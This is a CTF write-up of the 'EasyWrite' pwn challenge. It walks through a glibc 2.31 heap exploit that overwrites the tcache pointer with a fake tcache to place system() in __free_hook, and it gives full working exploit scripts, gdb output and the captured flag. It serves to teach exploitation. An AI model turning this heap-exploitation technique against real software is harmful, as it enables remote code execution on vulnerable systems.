# EasyWrite
write? what? where?

`nc 124.156.183.246 20000`

**Files**: `easywrite`, `libc-2.31.so`

The library used in this writeup is [`pwnscripts`](https://github.com/152334H/pwnscripts).

## TL;DR
* Input a fake tcache that has `entries[2] = __free_hook-0x8` and `count[2] = 1`
* locate the tcache pointer in libc to overwrite it with the fake one
* write "/bin/sh" + `system()` to the next allocated memory
* enjoy shell from `free()`.
## Starting off
We'll start off with some miscellanous information.

Exact libc version:
```bash
$ ./libc-database/identify libc-2.31.so
libc6_2.31-0ubuntu9_amd64
```
Decompiler output:
```c
int main() {
  char **addr; // [rsp-28h] [rbp-28h]
  char *mem1; // [rsp-20h] [rbp-20h]
  char *mem2; // [rsp-18h] [rbp-18h]

  setbuf(stdout, 0);
  setbuf(stdin, 0);
  setbuf(stderr, 0);
  alarm(60);
  sleep(2);
  printf("Here is your gift:%p\n", &setbuf);
  mem1 = malloc(768); // big 0x310
  write(1, "Input your message:", 19);
  read(0, mem1, 767);
  write(1, "Where to write?:", 16);
  read(0, &addr, 8);
  *addr = mem1;
  mem2 = malloc(48);  // fastbin 0x40
  write(1, "Any last message?:", 18);
  read(0, mem2, 47);
  free(mem2);
  return 0;
}
```
And checksec:
```python
[*] '/easywrite'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
`main()` is really simple:
0. initialisation stuff (remove buffering, set timeout alarm)
1. Free libc leak via `printf()`
2. A raw `read(0x300-1)` to a pointer `mem1 = malloc(0x300)`
3. A pointer (`addr`) is read _from stdin_ via `read(8)`, and the data _at the pointer_ (`*addr`) is overwritten with `mem1`.
    This is the crux of the challenge.
4. A raw `read(0x30-1)` to another pointer `mem2 = malloc(0x30)`
5. `free(mem2)`, and then `exit(0)` in `__libc_start_main`.

Step (3) requires the user to provide a dereferencable pointer to the program. Since all protections (including ASLR) are on for `./easywrite`, the pointer we provide in step (3) must be a part of `libc.so.6`'s allocated memory.

From there, we can condense `main()` into an even simpler outline:
1. The user gets to replace a single pointer *within libc* with a pointer to `0x300-1` bytes of user-controlled data, and
2. The user gets to write `0x30-1` bytes to a `malloc()`'d pointer that is immediately `free()`'d.

There's no issue with analysing the binary, but figuring out *what* to do here is a lot harder.

## Write where?

As the challenge title suggests, the key to pwning the binary here is to figure out *where* in Glibc to write up. The entire shared object is pretty big, but we can cut down on the search space with a few heuristics.

First off, the bulk of libc is non-writeable. We're only interested in writeable addresses, so we can skip everything here (the addresses are random; focus on the offsets):
```python
0x00007f2afd967000 0x00007f2afd98c000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007f2afd98c000 0x00007f2afdb04000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007f2afdb04000 0x00007f2afdb4e000 0x000000000019d000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007f2afdb4e000 0x00007f2afdb4f000 0x00000000001e7000 --- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007f2afdb4f000 0x00007f2afdb52000 0x00000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
```
And just focus on this part:
```python
0x00007f2afdb52000 0x00007f2afdb55000 0x00000000001ea000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007f2afdb55000 0x00007f2afdb5b000 0x0000000000000000 rw-
```
In IDA, that r/w section starts right off at libc's Global Offset Table. That sounds like a good place to start.
```c
.got.plt:00000000001EB018 off_1EB018      dq offset memmove       ; DATA XREF: bcopy-7E4DC↑r
.got.plt:00000000001EB018                                         ; Indirect relocation
.got.plt:00000000001EB020 off_1EB020      dq offset strnlen       ; DATA XREF: sub_25350+4↑r
.got.plt:00000000001EB020                                         ; Indirect relocation
.got.plt:00000000001EB028 off_1EB028      dq offset wcschr        ; DATA XREF: sub_25360+4↑r
...
.got.plt:00000000001EB178 off_1EB178      dq offset strcasecmp    ; DATA XREF: sub_25600+4↑r
.got.plt:00000000001EB178                                         ; Indirect relocation
.got.plt:00000000001EB180 off_1EB180      dq offset strncpy       ; DATA XREF: sub_25610+4↑r
.got.plt:00000000001EB180                                         ; Indirect relocation
.got.plt:00000000001EB188 off_1EB188      dq offset memmove       ; DATA XREF: sub_25620+4↑r
.got.plt:00000000001EB188 _got_plt        ends                    ; Indirect relocation
```
...or it would've been, if there were any useful functions in the whole list. Long story short; all of the functions there are never called by the program<sup>1</sup>, so we'll move on.

After the Procedure Linkage Table, there's a long stretch of garbage in the form of the `.data` and `.bss` sections, along with a few other `__libc_*` sections that are basically never referenced either<sup>2</sup>.

A few hours of blank staring later, and my eyes finally saw something I'd missed the last 10 times I tried scanning IDA View-A:
```c
.bss:00000000001EEB28                 public __free_hook ; weak
.bss:00000000001EEB28 ; __int64 (__fastcall *_free_hook)(_QWORD, _QWORD)
.bss:00000000001EEB28 __free_hook     dq ?                    ; DATA XREF: LOAD:0000000000008A48↑o
.bss:00000000001EEB28                                         ; .got:__free_hook_ptr↑o
```
*__free_hook? Isn't that that thing that I heard about once a long time ago in a [writeup](https://teamrocketist.github.io/2019/09/09/Pwn-N1CTF-2019-warmup/) somewhere?*

To repeat something you may already know: `__free_hook()` is a function pointer that overrides the default behaviour of `free()` iff `__free_hook != NULL`. If we change `__free_hook` to point to a `one_gadget` (or something), we'll have beaten the challenge.

Let's try that.
```python
from pwnscripts import *
context.binary = 'easywrite'
context.libc_database = 'libc-database'
context.libc = 'libc-2.31.so'

context.log_level = 'debug'
r = context.binary.process()
context.libc.calc_base('setbuf', unpack_hex(r.recvline()))

free_hook = 0x00000000001EEB28+context.libc.address
r.sendafter('Input your message:', pack(context.libc.select_gadget(1)))
r.sendafter('Where to write?:', pack(free_hook))
r.sendafter('Any last message?:', b'\0')

r.interactive()
```
Things are never so simple, of course.
```python
[DEBUG] Received 0x12 bytes:
    b'Any last message?:'
[DEBUG] Sent 0x1 bytes:
    0 * 0x1
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[*] Got EOF while reading in interactive
$
```
A little backtracing in `gdb` shows the issue. First, we'll let it crash, and observe the backtrace:
```c
[#0] Id 1, Name: "ld-linux-x86-64", stopped 0x555556b192a0 in ?? (), reason: SIGSEGV
───────────────────────────────────── trace ────
[#0] 0x555556b192a0 → out 0x3c, al
[#1] 0x7f53d96b2376 → mov eax, 0x0
[#2] 0x7f53d96abb28 → __after_morecore_hook()
[#3] 0x555556b192a0 → out 0x3c, al
[#4] 0x555556b195b0 → add BYTE PTR [rax], al
────────────────────────────────────────────────
```
The backtrace isn't actually that helpful, so I just hit `n` and `s` continually until I isolated the crashing instruction:
```c
$rax   : 0x0000555555fa02a0  →  0x00007f776fd29ce6  →  <execvpe+1142> mov rsi, r10
$rbx   : 0x00007f776fe383a0  →  0x8d4c5741fa1e0ff3
$rcx   : 0x00007f776fd53fb2  →  0x5677fffff0003d48 ("H="?)
$rdx   : 0x2f
$rsp   : 0x00007fff3250f9f8  →  0x00007f776fe38376  →  0x4d8b4800000000b8
$rbp   : 0x00007fff3250fa20  →  0x0000000000000000
$rsi   : 0x00007f776fe38376  →  0x4d8b4800000000b8
$rdi   : 0x0000555555fa05b0  →  0x0a65657266206200
$rip   : 0x00007f776fce08f1  →  <free+161> jmp rax
$r8    : 0x0000555555fa05b0  →  0x0a65657266206200
$r9    : 0x00007f776fc4a548  →  0x0000000000000000
$r10   : 0x00007f776fe2ebe0  →  0x0000555555fa05e0  →  0x0000000000000000
$r11   : 0x246
$r12   : 0x00007f776fe38150  →  0x8949ed31fa1e0ff3
$r13   : 0x00007fff3250fb08  →  0x000000000000001c
$r14   : 0x0
$r15   : 0x0
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
─────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fff3250f9f8│+0x0000: 0x00007f776fe38376  →  0x4d8b4800000000b8    ← $rsp
0x00007fff3250fa00│+0x0008: 0x00007f776fe31b28  →  0x0000555555fa02a0  →  0x00007f776fd29ce6  →  <execvpe+1142> mov rsi, r10
0x00007fff3250fa08│+0x0010: 0x0000555555fa02a0  →  0x00007f776fd29ce6  →  <execvpe+1142> mov rsi, r10
0x00007fff3250fa10│+0x0018: 0x0000555555fa05b0  →  0x0a65657266206200
0x00007fff3250fa18│+0x0020: 0xececd8c03b604200
0x00007fff3250fa20│+0x0028: 0x0000000000000000   ← $rbp
0x00007fff3250fa28│+0x0030: 0x00007f776fc6a0b3  →  <__libc_start_main+243> mov edi, eax
0x00007fff3250fa30│+0x0038: 0x0000000000000000
───────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f776fce08e5 <free+149>       nop    DWORD PTR [rax]
   0x7f776fce08e8 <free+152>       mov    rsi, QWORD PTR [rsp+0x18]
   0x7f776fce08ed <free+157>       add    rsp, 0x18
 → 0x7f776fce08f1 <free+161>       jmp    rax
   0x7f776fce08f3 <free+163>       nop    DWORD PTR [rax+rax*1+0x0]
   0x7f776fce08f8 <free+168>       cmp    QWORD PTR [rip+0x151279], rsi        # 0x7f776fe31b78
   0x7f776fce08ff <free+175>       ja     0x7f776fce090a <free+186>
   0x7f776fce0901 <free+177>       cmp    QWORD PTR [rip+0x151268], rsi        # 0x7f776fe31b70
   0x7f776fce0908 <free+184>       ja     0x7f776fce08cb <free+123>
───────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ld-linux-x86-64", stopped 0x7f776fce08f1 in free (), reason: SINGLE STEP
─────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f776fce08f1 → free()
[#1] 0x7f776fe38376 → mov eax, 0x0
[#2] 0x7f776fe31b28 → __after_morecore_hook()
[#3] 0x555555fa02a0 → out 0x9c, al
[#4] 0x555555fa05b0 → add BYTE PTR [rdx+0x20], ah
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```
`gdb`'s paused here at the jump to `__free_hook`. There's been a slight error in logic, here: instead of jumping to `<execvpe+1142>` (a one_gadget), `__free_hook` is causing the program to jump to a *pointer to* the one_gadget, which is naturally non-executable.

So, instead of searching for just any important value in libc, what we should _really_ be searching for is an important _pointer_ in libc to a significant buffer in memory<sup>0</sup>.

My first idea was to try to overwrite the `FILE *` pointers at the end of data:
```c
.data:00000000001EC780                 public stderr
.data:00000000001EC780 stderr          dq offset _IO_2_1_stderr_
.data:00000000001EC788                 public stdout
.data:00000000001EC788 stdout          dq offset _IO_2_1_stdout_
.data:00000000001EC790                 public stdin
.data:00000000001EC790 stdin           dq offset _IO_2_1_stdin_
.data:00000000001EC798                 dq offset loc_27400
.data:00000000001EC798 _data           ends
```
If you read the footnotes<sup>1</sup>, you probably already know why this didn't work: they're essentially never used.

Eventually, I got a little bit stir-crazy looking over the IDA menu, and I realised I needed to change my approach.

## Digging into [`malloc.c`](https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/malloc/malloc.c)
Looking back at the code, I was convinced that the second allocation of memory had to be important — this was a _CTF_ challenge, after all. What I didn't immediately understand was how glibc's heap system could be affected by any write-to-libc. The heap always lies on a separate page; there's no way to write to there directly.

Lollygagging about `gdb`, I tried to find anything that might be useful to understanding the heap.
```c
gef➤  heap chunks
Chunk(addr=0x555556b19010, size=0x290, flags=PREV_INUSE)
    [0x0000555556b19010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x555556b192a0, size=0x310, flags=PREV_INUSE)
    [0x0000555556b192a0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x555556b195b0, size=0x40, flags=PREV_INUSE)
    [0x0000555556b195b0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x555556b195f0, size=0x20a20, flags=PREV_INUSE)  ←  top chunk
gef➤  heap bins
─────────────────────────────────── Tcachebins for arena 0x7f53d96a8b80 ───────────────────────────────────
──────────────────────────────────── Fastbins for arena 0x7f53d96a8b80 ────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
──────────────────────────────── Unsorted Bin for arena '*0x7f53d96a8b80' ────────────────────────────────
[+] Found 0 chunks in unsorted bin.
───────────────────────────────── Small Bins for arena '*0x7f53d96a8b80' ─────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
───────────────────────────────── Large Bins for arena '*0x7f53d96a8b80' ─────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
```
Wait a minute. `arena 0x7f53d96a8b80`? That sounds a lot like a libc pointer.
```c
gef➤  heap arenas
Arena (base=0x7f53d96a8b80, top=0x555556b195e0, last_remainder=0x0, next=0x7f53d96a8b80, next_free=0x0, system_mem=0x21000)
gef➤  vmmap
...
0x00007f53d96a8000 0x00007f53d96ab000 0x00000000001ea000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007f53d96ab000 0x00007f53d96b1000 0x0000000000000000 rw-
...
```
And it is! In IDA Pro, this part of libc was labelled as the uninspiring `dword_1EBB80`, so this was definitely a lucky find.

With a bit of [searching](https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/malloc_state), we can find the structure of the arena:
```c
struct malloc_state {
  __libc_lock_define (, mutex);
  int flags;
  int have_fastchunks;
  mfastbinptr fastbinsY[NFASTBINS]; // starts from 0x10 (?)
  mchunkptr top;    // This is +0x60
  mchunkptr last_remainder;
  mchunkptr bins[NBINS * 2 - 2];
  unsigned int binmap[BINMAPSIZE];
  struct malloc_state *next;
  struct malloc_state *next_free;
  INTERNAL_SIZE_T attached_threads;
  INTERNAL_SIZE_T system_mem;
  INTERNAL_SIZE_T max_system_mem;
}
```
Of particular note are the various `m.*ptr` variables, as well as the `next.*` pointers. Overwriting any of these could change the behaviour of the heap.

I started off by overwriting the `top` pointer, assessing what would happen if I replaced it with a pointer to garbage bytes
```python
#free_hook = 0x00000000001EEB28+context.libc.address
arena = 0x1EBB80 + context.libc.address
r.sendafter('Input your message:', b'a'*500)
r.sendafter('Where to write?:', pack(arena + 0x60))
r.sendafter('Any last message?:', b'\0')

r.interactive()
```
We get an interesting crash:
```python
[DEBUG] Received 0x10 bytes:
    b'Where to write?:'
[DEBUG] Sent 0x8 bytes:
    00000000  e0 cb 02 12  02 7f 00 00                            │····│····│
    00000008
[DEBUG] Received 0x1d bytes:
    b'malloc(): corrupted top size\n'
Traceback (most recent call last):
```
The top chunk, like all malloc'd chunks, follows the following format:
```c
struct malloc_chunk {
  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
  struct malloc_chunk *fd, *bk;         /* double links -- used only if free. */
  struct malloc_chunk *fd_nextsize, *bk_nextsize; /* double links -- used only if free. */
}
```
glibc [detects](https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/malloc/malloc.c#L4106) that the top chunk is a bit too large, and sends the program to abort:
```c
static void *_int_malloc (mstate av, size_t bytes) {
    ...
    if (__glibc_unlikely (size > av->system_mem))
        malloc_printerr ("malloc(): corrupted top size");
    ...
}
```
If we fix the mchunk_size to fit the glibc check... not much interesting happens. Nothing *will* ever happen, because the other bits of heap metadata aren't really all-too-important for allocating memory from the top chunk.

The allocation we want to manipulate — `malloc(0x30)` — can come from a number of different places, including the Fast Bins. I made a similar stab at editing `av->fastbinsY[2]`, but not much<sup>3</sup> came out of it. The rest of the pointers are even less useful. What to do?

# Getting arbitrary-libc-write
With a few extra hours of digging, I realised something I should've probably noticed a while back: the `tcache` variable.

Anyone familiar with the glibc heap will notice that there's an important bin missing from `malloc_state`. Considering that `malloc(0x30)` can only recycle from the Fast Bins and the Tcache, this was evidently worth investigating.

Over in `malloc.c/__libc_malloc`, the `tcache` variable appears to pop out of nowhere, undefined:
```c
void *__libc_malloc (size_t bytes) {
  mstate ar_ptr;
  void *victim;
  ...
#if USE_TCACHE
  size_t tbytes;
  if (!checked_request2size (bytes, &tbytes)) /* exit with error */
  size_t tc_idx = csize2tidx (tbytes);  /* == 2 for malloc(0x30) */
  MAYBE_INIT_TCACHE ();
  if (tc_idx < mp_.tcache_bins && tcache && tcache->counts[tc_idx] > 0)
    return tcache_get (tc_idx);
#endif
  ...
}
static __always_inline void *tcache_get (size_t tc_idx) {
  tcache_entry *e = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  e->key = NULL;
  return (void *) e;
}
```
By ingeniously _clicking on the variable_, I realised that the `tcache` was another global pointer:
```c
# define TCACHE_MAX_BINS		64
typedef struct tcache_entry {
  struct tcache_entry *next;
  struct tcache_perthread_struct *key;
} tcache_entry;
typedef struct tcache_perthread_struct {
  uint16_t counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
/* global variable here ! */
static __thread tcache_perthread_struct *tcache = NULL;
```
Thus, after about eight hours of digging, I had finally found an exploit path that looked simple enough for me to accomplish:
1. Construct a fake `tcache_perthread_struct` that will pass the security checks, with `tcache->entries[2]` set to the location of `__free_hook` described a long time ago.
2. Fill in the first `main()` input with the fake tcache, and overwrite the global `tcache` pointer with the pointer to the user-controlled tcache
3. The new `malloc(0x30)`'d memory will point to where `__free_hook` is. We can fill up that memory space with a one_gadget.
4. Allow `free()` to spawn a shell.

All that's left is...
## Implementation Hell
It was simple enough to create the fake `tcache` in python:
```python
SIZE = 0x40 #size of the second allocation
def tcache_perthread_struct(fake_ptrs: dict):
    '''fake_ptrs has (address: size) key-pairs'''
    def csize2tidx(x): return (x-1)//16 -1
    TCACHE_MAX_BINS = 0x40

    counts = [0 for _ in range(TCACHE_MAX_BINS)]
    entries = [0 for _ in range(TCACHE_MAX_BINS)]
    for addr,size in fake_ptrs.items():
        tidx = csize2tidx(size)
        counts[tidx] += 1
        entries[tidx] = addr
    return b''.join(map(p16,counts)) + b''.join(map(p64,entries))

fake_tcache = tcache_perthread_struct({free_hook: SIZE})
```
The issue arrives with figuring out precisely *where* the tcache pointer is. IDA Pro was not<sup>4</sup> very helpful.

Eventually, I figured out from [online sources](https://github.com/pwndbg/pwndbg/blob/dev/pwndbg/heap/ptmalloc.py#L138-L143) that the tcache (the real tcache in memory; not the pointer to the tcache) is always located at `heap_address+0x10`. From there, I used `gdb` to search for pointers to that space in memory:
```python
gef➤  vmmap heap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000555557527000 0x0000555557548000 0x0000000000000000 rw- [heap]
gef➤  grep 0x0000555557527010
[+] Searching '\x10\x70\x52\x57\x55\x55\x00\x00' in memory
[+] In '[heap]'(0x555557527000-0x555557548000), permission=rw-
  0x5555575275b8 - 0x5555575275d8  →   "\x10\x70\x52\x57\x55\x55\x00\x00[...]"
[+] In (0x7facf8661000-0x7facf8667000), permission=rw-
  0x7facf8666530 - 0x7facf8666550  →   "\x10\x70\x52\x57\x55\x55\x00\x00[...]"
gef➤  vmmap libc
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x00007facf8473000 0x00007facf8498000 0x0000000000000000 r-- /home/a/libc-database/libs/libc6_2.31-0ubuntu9_amd64/libc.so.6
```
There's only one pointer (`0x7facf8666530`) from the libc region, so we'll take that to be the tcache pointer.

All that's left to do is to grab a one_gadget and run with it:
```python
from pwnscripts import *
context.binary = 'easywrite'
context.libc_database = 'libc-database'
context.libc = 'libc-2.31.so'

context.log_level = 'debug'
r = context.binary.process()
context.libc.calc_base('setbuf', unpack_hex(r.recvline()))

def tcache_perthread_struct(fake_ptrs: dict):
    '''fake_ptrs has (address: size) key-pairs'''
    def csize2tidx(x): return (x-1)//16 -1
    TCACHE_MAX_BINS = 0x40

    counts = [0 for _ in range(TCACHE_MAX_BINS)]
    entries = [0 for _ in range(TCACHE_MAX_BINS)]
    for addr,size in fake_ptrs.items():
        tidx = csize2tidx(size)
        counts[tidx] += 1
        entries[tidx] = addr
    return b''.join(map(p16,counts)) + b''.join(map(p64,entries))

SIZE = 0x40 # size of the 2nd allocation
free_hook = 0x00000000001EEB28+context.libc.address
tcache_pointer = 0x7facf8666530-0x00007facf8473000 + context.libc.address
fake_tcache = tcache_perthread_struct({free_hook: SIZE})

r.sendafter('Input your message:', fake_tcache)
r.sendafter('Where to write?:', pack(tcache_pointer))
r.sendafter('Any last message?:', pack(context.libc.select_gadget(1)))

r.interactive()
```
And we get a shell:
```c
────────────────────────────────────────────────────────────────────────────────────── stack ────
[!] Unmapped address
──────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f792a05bda9 <execvpe+1337>   mov    rax, QWORD PTR [rbp-0x68]
   0x7f792a05bdad <execvpe+1341>   mov    QWORD PTR [rbp-0x48], rax
   0x7f792a05bdb1 <execvpe+1345>   jmp    0x7f792a05bcdb <execvpe+1131>
 → 0x7f792a05bdb6 <execvpe+1350>   call   0x7f792a0a7970 <__stack_chk_fail>
   ↳  0x7f792a0a7970 <__stack_chk_fail+0> endbr64
      0x7f792a0a7974 <__stack_chk_fail+4> push   rax
      0x7f792a0a7975 <__stack_chk_fail+5> pop    rax
      0x7f792a0a7976 <__stack_chk_fail+6> lea    rdi, [rip+0x876e7]        # 0x7f792a12f064
      0x7f792a0a797d <__stack_chk_fail+13> sub    rsp, 0x8
      0x7f792a0a7981 <__stack_chk_fail+17> call   0x7f792a0a7990 <__fortify_fail>
───────────────────────────────────────────────────────────────────────── arguments (guessed) ────
__stack_chk_fail (
)
───────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ld-linux-x86-64", stopped 0x7f792a05bdb6 in execvpe (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f792a05bdb6 → execvpe()
[#1] 0x7f7929f9c0b3 → __libc_start_main()
[#2] 0x7f792a16a17e → hlt
[#3] 0x7ffe534a51a8 → sbb al, 0x0
──────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```
Wait, what?
## Triage
We'll modify the code a little bit to stop at the one_gadget:
```python
oneg = context.libc.select_gadget(1)
gdb.attach(r, gdbscript='b *'+hex(oneg)+'\nc')
r.sendafter('Any last message?:', pack(oneg))
```
`gdb` is enlightening:
```c
$rax   : 0x00007f98a3e18ce6  →  <execvpe+1142> mov rsi, r10
$rbx   : 0x00007f98a3f273a0  →  0x8d4c5741fa1e0ff3
$rcx   : 0x00007f98a3e42fb2  →  0x5677fffff0003d48 ("H="?)
$rdx   : 0x2f
$rsp   : 0x00007ffe510e5638  →  0x00007f98a3f27376  →  0x4d8b4800000000b8
$rbp   : 0x00007ffe510e5660  →  0x0000000000000000
$rsi   : 0x00007f98a3f27376  →  0x4d8b4800000000b8
$rdi   : 0x00007f98a3f20b28  →  0x00007f98a3e18ce6  →  <execvpe+1142> mov rsi, r10
$rip   : 0x00007f98a3e18ce6  →  <execvpe+1142> mov rsi, r10
$r8    : 0x00007f98a3f20b28  →  0x00007f98a3e18ce6  →  <execvpe+1142> mov rsi, r10
$r9    : 0x00007f98a3d39548  →  0x0000000000000000
$r10   : 0x00007f98a3f1dbe0  →  0x0000555555ab55a0  →  0x0000000000000000
$r11   : 0x246
$r12   : 0x00007f98a3f27150  →  0x8949ed31fa1e0ff3
$r13   : 0x00007ffe510e5748  →  0x000000000000001c
$r14   : 0x0
$r15   : 0x0
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
─────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffe510e5638│+0x0000: 0x00007f98a3f27376  →  0x4d8b4800000000b8    ← $rsp
0x00007ffe510e5640│+0x0008: 0x00007f98a3f25530  →  0x0000555555ab52a0  →  0x0000000000000000
0x00007ffe510e5648│+0x0010: 0x0000555555ab52a0  →  0x0000000000000000
0x00007ffe510e5650│+0x0018: 0x00007f98a3f20b28  →  0x00007f98a3e18ce6  →  <execvpe+1142> mov rsi, r10
0x00007ffe510e5658│+0x0020: 0x0caf9f8a935f0f00
0x00007ffe510e5660│+0x0028: 0x0000000000000000   ← $rbp
0x00007ffe510e5668│+0x0030: 0x00007f98a3d590b3  →  <__libc_start_main+243> mov edi, eax
0x00007ffe510e5670│+0x0038: 0x0000000000000000
───────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f98a3e18cd8 <execvpe+1128>   add    DWORD PTR [rbp+0x52], esi
   0x7f98a3e18cdb <execvpe+1131>   mov    QWORD PTR [r10+0x10], 0x0
   0x7f98a3e18ce3 <execvpe+1139>   mov    rdx, r12
 → 0x7f98a3e18ce6 <execvpe+1142>   mov    rsi, r10
   0x7f98a3e18ce9 <execvpe+1145>   lea    rdi, [rip+0xd08ba]        # 0x7f98a3ee95aa
   0x7f98a3e18cf0 <execvpe+1152>   mov    QWORD PTR [rbp-0x78], r11
   0x7f98a3e18cf4 <execvpe+1156>   call   0x7f98a3e18160 <execve>
   0x7f98a3e18cf9 <execvpe+1161>   mov    r11, QWORD PTR [rbp-0x78]
   0x7f98a3e18cfd <execvpe+1165>   mov    eax, DWORD PTR fs:[r14]
───────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ld-linux-x86-64", stopped 0x7f98a3e18ce6 in execvpe (), reason: BREAKPOINT
```
The one_gadget requirements here probably failed. These are the three<sup>4</sup> gadgets available:
```python
0xe6ce3 execve("/bin/sh", r10, r12)
constraints:
  [r10] == NULL || r10 == NULL
  [r12] == NULL || r12 == NULL

0xe6ce6 execve("/bin/sh", r10, rdx)
constraints:
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0xe6ce9 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```
Cross-referencing between this and the `gdb` context, it becomes apparent that there's no easy one_gadget to jump to.

After spending an hour or so staring at ROP gadgets<sup>6</sup> and potential one_gadget alternatives, I realised the rather obvious exploit path I was missing.

`__free_hook(ptr)` is called with the `ptr` to be freed, which happens to be memory that we're in control of. Why not just jump to `system()`, and put `"/bin/sh"` at the front of the allocated memory?
```python
fake_tcache = tcache_perthread_struct({free_hook-0x8: SIZE})    # -8 to store /bin/sh
r.sendafter('Input your message:', fake_tcache)
r.sendafter('Where to write?:', pack(tcache_pointer))
r.sendafter('Any last message?:', b'/bin/sh\0' + pack(context.libc.symbols['system']))
r.interactive()
```
```python
[*] Switching to interactive mode
$ echo hello
[DEBUG] Sent 0xb bytes:
    b'echo hello\n'
[DEBUG] Received 0x6 bytes:
    b'hello\n'
hello
$
```
It worked.
```
[+] Opening connection to 124.156.183.246 on port 20000: Done
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$ f
```
...locally. Not on remote.

Long story short, I was using `ld-linux.so --library-path` to simulate the remote `libc-2.31.so` environment, but `ld-linux` doesn't provide a *perfect* subsitute for running the actual libc bare-metal<sup>7</sup>.

Luckily, I had a machine with an extremely similar version of libc available. Debugging on that machine, I realised that the value of the `tcache_pointer` I had calculated earlier was off by 0x40 bytes:
```python
tcache_pointer = 0x7facf8666530-0x00007facf8473000+context.libc.address-0x40
```
With that, we're finally done.
```python
[+] Opening connection to 124.156.183.246 on port 20000: Done
[*] Switching to interactive mode
$ ls
bin
dev
easywrite
flag
lib
lib32
lib64
libx32
run.sh
usr
$ cat flag
n1ctf{09b1e57ba44889be4f9ec8feee88b3be}
$
```
## Full code
```python
from pwnscripts import *
context.binary = 'easywrite'
context.libc_database = 'libc-database'
context.libc = 'libc-2.31.so'

r = remote('124.156.183.246', 20000)
context.libc.calc_base('setbuf', unpack_hex(r.recvline()))

def tcache_perthread_struct(fake_ptrs: dict):
    '''fake_ptrs has (address: size) key-pairs'''
    def csize2tidx(x): return (x-1)//16 -1
    TCACHE_MAX_BINS = 0x40

    counts = [0 for _ in range(TCACHE_MAX_BINS)]
    entries = [0 for _ in range(TCACHE_MAX_BINS)]
    for addr,size in fake_ptrs.items():
        tidx = csize2tidx(size)
        counts[tidx] += 1
        entries[tidx] = addr
    return b''.join(map(p16,counts)) + b''.join(map(p64,entries))

SIZE = 0x40 # size of the 2nd allocation
tcache_pointer = 0x7f638ae58530-0x00007f638ac65000+context.libc.address-0x40
fake_tcache = tcache_perthread_struct({context.libc.symbols['__free_hook']-0x8: SIZE})

r.sendafter('Input your message:', fake_tcache)
r.sendafter('Where to write?:', pack(tcache_pointer))
r.sendafter('Any last message?:', b'/bin/sh\0' + pack(context.libc.symbols['system']))

r.interactive()
```
## Footnotes
0. ...which is practically identical what I said at the start of the writeup.
1. You can personally test this by overwriting all the values of `.got.plt` with garbage in `gdb`. The program exits gracefully.
2. Particularly, `__libc_IO_vtables` is useless here, because `main()` is committed to using raw `read()`s and `write()`s, instead of the standard I/O functions provided by libc.
3. The code for fastbin-malloc doesn't do much for us here. (Note that the fastbin_index for `malloc(0x30)` is 2)
    ```c
    #define fastbin_index(sz) ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)
